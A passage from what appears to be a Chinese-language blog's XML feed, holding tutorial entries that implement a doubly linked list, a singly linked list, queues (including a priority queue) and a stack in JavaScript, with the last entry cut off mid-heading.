class_">Node</span>(element)</span><br><span class="line">        <span class="keyword">let</span> current = head</span><br><span class="line">        <span class="keyword">if</span>(length == <span class="number">0</span>)&#123;</span><br><span class="line">            head = node</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">while</span>(current.<span class="property">next</span>)&#123;</span><br><span class="line">                current = current.<span class="property">next</span></span><br><span class="line">            &#125;</span><br><span class="line">            node.<span class="property">previous</span> = current</span><br><span class="line">            current.<span class="property">next</span> = node</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        length++</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//链表在某个地方插入</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">insertNode</span> = <span class="keyword">function</span>(<span class="params">element,position</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> node = <span class="keyword">new</span> <span class="title class_">Node</span>(element)</span><br><span class="line">        <span class="keyword">let</span> current = head</span><br><span class="line">        <span class="keyword">if</span>(position&gt;=<span class="number">0</span>&amp;&amp;position&lt;length)&#123;</span><br><span class="line">            <span class="keyword">if</span>(position==<span class="number">0</span>)&#123;</span><br><span class="line">                head = node</span><br><span class="line">                current.<span class="property">previous</span> = head</span><br><span class="line">                head.<span class="property">next</span> = current</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">let</span> last = <span class="literal">null</span></span><br><span class="line">                <span class="keyword">let</span> index = <span class="number">0</span></span><br><span class="line">                <span class="keyword">while</span>(index&lt;position)&#123;</span><br><span class="line">                    last = current</span><br><span class="line">                    current = current.<span class="property">next</span></span><br><span class="line">                    index++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//设置好新节点的previous和next</span></span><br><span class="line">                node.<span class="property">previous</span> = last</span><br><span class="line">                node.<span class="property">next</span> = current</span><br><span class="line">                <span class="comment">//分别设置之前前节点的下一个目标为node,后节点的上一个目标为node</span></span><br><span class="line">                current.<span class="property">previous</span> = node</span><br><span class="line">                last.<span class="property">next</span> = node</span><br><span class="line">            &#125;</span><br><span class="line">            length++;</span><br><span class="line">            <span class="keyword">return</span> current;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//链表在某个位置删除元素</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">removeatNode</span> = <span class="keyword">function</span>(<span class="params">position</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> current = head</span><br><span class="line">        <span class="keyword">if</span>(position&gt;=<span class="number">0</span>&amp;&amp;position&lt;length)&#123;</span><br><span class="line">            <span class="keyword">if</span>(position==<span class="number">0</span>)&#123;</span><br><span class="line">                head = current.<span class="property">next</span>;</span><br><span class="line">                <span class="keyword">if</span>(head)&#123;</span><br><span class="line">                head.<span class="property">previous</span> = <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">let</span> index = <span class="number">0</span></span><br><span class="line">                <span class="keyword">let</span> last = <span class="literal">null</span></span><br><span class="line">                <span class="keyword">while</span>(index&lt;position)&#123;</span><br><span class="line">                    last = current</span><br><span class="line">                    current = current.<span class="property">next</span></span><br><span class="line">                    index++;</span><br><span class="line">                &#125;</span><br><span class="line">                last.<span class="property">next</span> = current.<span class="property">next</span></span><br><span class="line">                <span class="keyword">if</span>(current.<span class="property">next</span>)&#123;</span><br><span class="line">                current.<span class="property">next</span>.<span class="property">previous</span> = last</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            length--;</span><br><span class="line">            <span class="keyword">return</span> current;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//链表获取元素位置</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">indexOf</span> = <span class="keyword">function</span>(<span class="params">element</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">let</span> current = head</span><br><span class="line">        <span class="keyword">while</span>(current)&#123;</span><br><span class="line">            <span class="keyword">if</span>(current.<span class="property">element</span>==element)&#123;</span><br><span class="line">                <span class="keyword">return</span> index;</span><br><span class="line">            &#125;</span><br><span class="line">            current = current.<span class="property">next</span></span><br><span class="line">            index++</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//链表删除元素</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">removeNode</span> = <span class="keyword">function</span>(<span class="params">element</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">removeatNode</span>(<span class="variable language_">this</span>.<span class="title function_">indexOf</span>(element))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查是否为空栈</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isEmpty</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> length == <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//查询链表长度</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">size</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> length</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取链表</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">getHead</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> l = <span class="keyword">new</span> <span class="title class_">LinkedList</span>();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码 </category>
          
          <category> JavaScript </category>
          
          <category> 算法 </category>
          
          <category> 链表 </category>
          
          <category> 双向链表 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> 算法 </tag>
            
            <tag> 双向链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript-linkedlist</title>
      <link href="/javascript-linkedlist.htm"/>
      <url>/javascript-linkedlist.htm</url>
      
        <content type="html"><![CDATA[<h1 id="单向链表"><a href="#单向链表" class="headerlink" title="单向链表"></a>单向链表</h1><h4 id="什么是链表"><a href="#什么是链表" class="headerlink" title="什么是链表:"></a>什么是链表:</h4><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20200429184949517.png" alt="image-20200429184949517"></p><h4 id="实现思路框架"><a href="#实现思路框架" class="headerlink" title="实现思路框架:"></a>实现思路框架:</h4><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20200429185043345.png" alt="image-20200429185043345"></p><h4 id="链表具体操作"><a href="#链表具体操作" class="headerlink" title="链表具体操作:"></a>链表具体操作:</h4><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20200429185137374.png" alt="image-20200429185137374"></p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20200429185218427.png" alt="image-20200429185218427"></p><h3 id="先在Html引入JS"><a href="#先在Html引入JS" class="headerlink" title="先在Html引入JS:"></a><u><strong>先在Html引入JS:</strong></u></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;TEST&lt;/title&gt;</span><br><span class="line">    &lt;script src=&quot;./03_链表.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="链表操作-js"><a href="#链表操作-js" class="headerlink" title="链表操作.js:"></a><strong><u>链表操作.js:</u></strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title class_">Linkedlist</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> head = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">let</span> length = <span class="number">0</span></span><br><span class="line">    <span class="comment">//辅助类的添加</span></span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">Node</span> = <span class="keyword">function</span>(<span class="params">element</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">element</span> = element</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">next</span> = <span class="literal">null</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//链表追加插入</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">append</span> = <span class="keyword">function</span>(<span class="params">element</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> node = <span class="keyword">new</span> <span class="title class_">Node</span>(element)</span><br><span class="line">        <span class="keyword">let</span> current = head</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">null</span>)&#123;</span><br><span class="line">            head = node</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">while</span>(current.<span class="property">next</span>)&#123;</span><br><span class="line">                current = current.<span class="property">next</span></span><br><span class="line">            &#125;</span><br><span class="line">            current.<span class="property">next</span> = node</span><br><span class="line">        &#125;</span><br><span class="line">        length++;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//链表在某个位置插入</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">insertNode</span> = <span class="keyword">function</span>(<span class="params">element,position</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> node = <span class="keyword">new</span> <span class="title class_">Node</span>(element)</span><br><span class="line">        <span class="comment">//解决越界问题</span></span><br><span class="line">        <span class="keyword">if</span>(position&gt;-<span class="number">1</span> &amp;&amp; position&lt;length)&#123;</span><br><span class="line">            <span class="keyword">if</span>(position == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">let</span> current = head</span><br><span class="line">                head = node</span><br><span class="line">                head.<span class="property">next</span> = current</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">let</span> index = <span class="number">0</span></span><br><span class="line">                <span class="keyword">let</span> current = head</span><br><span class="line">                <span class="keyword">let</span> previous = <span class="literal">null</span></span><br><span class="line">                <span class="keyword">while</span>(index &lt; position)&#123;</span><br><span class="line">                    previous = current</span><br><span class="line">                    current = current.<span class="property">next</span></span><br><span class="line">                    index++;</span><br><span class="line">                &#125;</span><br><span class="line">                previous.<span class="property">next</span> = node</span><br><span class="line">                node.<span class="property">next</span> = current</span><br><span class="line">            &#125;</span><br><span class="line">            length++;</span><br><span class="line">            <span class="keyword">return</span> current;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//链表通过位置删除节点</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">removeatNode</span> = <span class="keyword">function</span>(<span class="params">position</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(position&gt;-<span class="number">1</span> &amp;&amp; position&lt;length)&#123;</span><br><span class="line">            <span class="keyword">let</span> current = head</span><br><span class="line">            <span class="keyword">if</span>(position == <span class="number">0</span>)&#123;</span><br><span class="line">                head = current.<span class="property">next</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">let</span> previous = <span class="literal">null</span></span><br><span class="line">                <span class="keyword">let</span> index = <span class="number">0</span></span><br><span class="line">                <span class="keyword">while</span>(index&lt;position)&#123;</span><br><span class="line">                    previous = current</span><br><span class="line">                    current = current.<span class="property">next</span></span><br><span class="line">                    index++</span><br><span class="line">                &#125;</span><br><span class="line">                previous.<span class="property">next</span> = current.<span class="property">next</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            length--;</span><br><span class="line">            <span class="keyword">return</span> current;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//链表获取元素位置</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">indexOf</span> = <span class="keyword">function</span>(<span class="params">element</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> index =<span class="number">0</span></span><br><span class="line">        <span class="keyword">let</span> current = head</span><br><span class="line">        <span class="keyword">while</span>(current)&#123;</span><br><span class="line">            <span class="keyword">if</span>(current.<span class="property">element</span>==element)&#123;</span><br><span class="line">                <span class="keyword">return</span> index;</span><br><span class="line">            &#125;</span><br><span class="line">            current = current.<span class="property">next</span></span><br><span class="line">            index++</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//链表删除元素</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">removeNode</span> = <span class="keyword">function</span>(<span class="params">element</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//简化版如下</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">removeatNode</span>(<span class="variable language_">this</span>.<span class="title function_">indexOf</span>(element))</span><br><span class="line"></span><br><span class="line">        <span class="comment">//具体逻辑如下</span></span><br><span class="line">        <span class="comment">// let index = 0</span></span><br><span class="line">        <span class="comment">// let current = head</span></span><br><span class="line">        <span class="comment">// let previous = null</span></span><br><span class="line">        <span class="comment">// let iffind = false</span></span><br><span class="line">        <span class="comment">// while(index &lt; length)&#123;</span></span><br><span class="line">        <span class="comment">//     if(current.element == element)&#123;</span></span><br><span class="line">        <span class="comment">//         iffind = true;</span></span><br><span class="line">        <span class="comment">//         break;</span></span><br><span class="line">        <span class="comment">//     &#125;</span></span><br><span class="line">        <span class="comment">//     previous = current</span></span><br><span class="line">        <span class="comment">//     current = current.next</span></span><br><span class="line">        <span class="comment">//     index++</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="comment">// if(index == 0)&#123;</span></span><br><span class="line">        <span class="comment">//     head = current.next;</span></span><br><span class="line">        <span class="comment">//     length--;</span></span><br><span class="line">        <span class="comment">//     return head;</span></span><br><span class="line">        <span class="comment">// &#125;else if(iffind)&#123;</span></span><br><span class="line">        <span class="comment">//     previous.next = current.next</span></span><br><span class="line">        <span class="comment">//     length--;</span></span><br><span class="line">        <span class="comment">//     return head</span></span><br><span class="line">        <span class="comment">// &#125;else&#123;</span></span><br><span class="line">        <span class="comment">//     return null;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查是否为空栈</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isEmpty</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> length == <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//查询链表长度</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">size</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> length</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//查询整条链表</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">getHead</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> l = <span class="keyword">new</span> <span class="title class_">Linkedlist</span>()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码 </category>
          
          <category> JavaScript </category>
          
          <category> 算法 </category>
          
          <category> 链表 </category>
          
          <category> 单向链表 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> 算法 </tag>
            
            <tag> 单向链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript-queue</title>
      <link href="/javascript-queue.htm"/>
      <url>/javascript-queue.htm</url>
      
        <content type="html"><![CDATA[<h1 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h1><h4 id="队列是什么"><a href="#队列是什么" class="headerlink" title="队列是什么?"></a>队列是什么?</h4><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20200429091554941.png" alt="image-20200429091554941"></p><h4 id="队列实现操作"><a href="#队列实现操作" class="headerlink" title="队列实现操作:"></a>队列实现操作:</h4><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20200429091703742.png" alt="image-20200429091703742"></p><h3 id="新建Html引入js"><a href="#新建Html引入js" class="headerlink" title="新建Html引入js:"></a>新建Html引入js:</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;TEST&lt;/title&gt;</span><br><span class="line">    &lt;script src=&quot;./02_队列.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="队列操作-js"><a href="#队列操作-js" class="headerlink" title="队列操作.js:"></a>队列操作.js:</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title class_">Queue</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> items = []</span><br><span class="line"></span><br><span class="line">    <span class="comment">//入队</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">enqueue</span> = <span class="function">(<span class="params">element</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> items.<span class="title function_">push</span>(element)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//出队</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">dequeue</span> = <span class="function">()=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> items.<span class="title function_">shift</span>()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//查询列头</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">front</span> = <span class="function">()=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> items[<span class="number">0</span>]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查队列是否为空</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isEmpty</span> = <span class="function">()=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> items.<span class="property">length</span>===<span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取队列长度</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">size</span> = <span class="function">()=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> items.<span class="property">length</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="实际应用例子"><a href="#实际应用例子" class="headerlink" title="实际应用例子:"></a>实际应用例子:</h3><ul><li><strong><u>循环队列:击鼓传花</u></strong></li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//循环队列例子:击鼓传花</span></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>]</span><br><span class="line"><span class="keyword">let</span> drinking_game = <span class="keyword">function</span>(<span class="params">arr,numbers</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> queue = <span class="keyword">new</span> <span class="title class_">Queue</span>()</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> j=<span class="number">0</span>;j&lt;arr.<span class="property">length</span>;j++)&#123;</span><br><span class="line">        queue.<span class="title function_">enqueue</span>(arr[j]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(queue.<span class="title function_">size</span>()&gt;<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i =<span class="number">0</span>;i&lt;numbers-<span class="number">1</span>;i++)&#123;</span><br><span class="line">            queue.<span class="title function_">enqueue</span>(queue.<span class="title function_">dequeue</span>())</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> getout = queue.<span class="title function_">dequeue</span>()</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`本次出局的是<span class="subst">$&#123;getout&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> result = queue.<span class="title function_">dequeue</span>()</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`最终剩下的是<span class="subst">$&#123;result&#125;</span>`</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong><u>优先队列例子:VIP排队</u></strong></li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title class_">PriorityQueue</span> = <span class="keyword">function</span>(<span class="params">name,priority</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> items = []</span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">Queueitems</span> = <span class="keyword">function</span>(<span class="params">name,priority</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">priority</span> = priority</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">enqueue</span> = <span class="keyword">function</span>(<span class="params">name,priority</span>)&#123;</span><br><span class="line">    <span class="comment">//判断是否插入</span></span><br><span class="line">    <span class="keyword">let</span> queuebolean = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">let</span> queueitems = <span class="keyword">new</span> <span class="title class_">Queueitems</span>(name,priority)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;items.<span class="property">length</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(queueitems.<span class="property">priority</span>&gt;items[i].<span class="property">priority</span>)&#123;</span><br><span class="line">            items.<span class="title function_">splice</span>(i,<span class="number">0</span>,queueitems)</span><br><span class="line">            queuebolean = <span class="literal">true</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!queuebolean)&#123;</span><br><span class="line">        items.<span class="title function_">push</span>(queueitems)</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">getitems</span> =<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> items</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码 </category>
          
          <category> JavaScript </category>
          
          <category> 算法 </category>
          
          <category> 队列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> 算法 </tag>
            
            <tag> 队列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript_stack</title>
      <link href="/javascript-stack.htm"/>
      <url>/javascript-stack.htm</url>
      
        <content type="html"><![CDATA[<h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><h4 id="栈是什么"><a href="#栈是什么" class="headerlink" title="栈是什么?"></a>栈是什么?</h4><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20200428222025214.png" alt="image-20200428222025214"></p><h4 id="我们要实现的是"><a href="#我们要实现的是" class="headerlink" title="我们要实现的是:"></a>我们要实现的是:</h4><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20200428222538650.png" alt="image-20200428222538650"></p><h3 id="先建立一个Html引入js"><a href="#先建立一个Html引入js" class="headerlink" title="先建立一个Html引入js"></a>先建立一个Html引入js</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>TEST<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./01_栈.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="栈操作-js"><a href="#栈操作-js" class="headerlink" title="栈操作.js"></a>栈操作.js</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//栈的操作</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="title class_">Stack</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = []</span><br><span class="line"></span><br><span class="line">    <span class="comment">//插入元素到栈底</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">push</span> = <span class="function">(<span class="params">element</span>)=&gt;</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> arr.<span class="title function_">push</span>(element)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//拿出栈顶元素</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">pop</span> = <span class="function">()=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> arr.<span class="title function_">pop</span>()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//查看栈顶</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">peek</span> = <span class="function">()=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> arr[arr.<span class="property">length</span> - <span class="number">1</span>]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//是否为空栈</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isEmpty</span> = <span class="function">()=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> arr.<span class="property">length</span> == <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//清空栈</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">clear</span> = <span class="function">()=&gt;</span>&#123;</span><br><span class="line">        arr = []</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//查看栈所有元素</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">getAll</span> = <span class="function">()=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> arr</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//查看栈元素数量</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">size</span> = <span class="function">()=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> arr.<span class="property">length</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用:"></a>实际应用:</h3><h5 id="十进制转二进制"><a href="#十进制转二进制" 